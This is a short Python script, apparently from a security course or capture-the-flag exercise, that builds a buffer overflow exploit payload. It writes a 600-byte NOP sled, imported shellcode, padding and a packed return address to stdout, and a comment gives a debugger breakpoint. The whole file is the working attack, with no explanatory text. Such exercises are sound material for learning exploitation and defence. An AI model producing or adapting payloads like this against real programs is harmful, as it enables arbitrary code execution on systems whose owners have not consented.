from shellcode import shellcode
from struct import pack
import sys


# break *0x08049d81
def main():
	sys.stdout.buffer.write((b'\x90' * 600) + shellcode + (b'\x12' * 413) + pack("<I", 0xfffe87fe))



if __name__ == "__main__":
	main()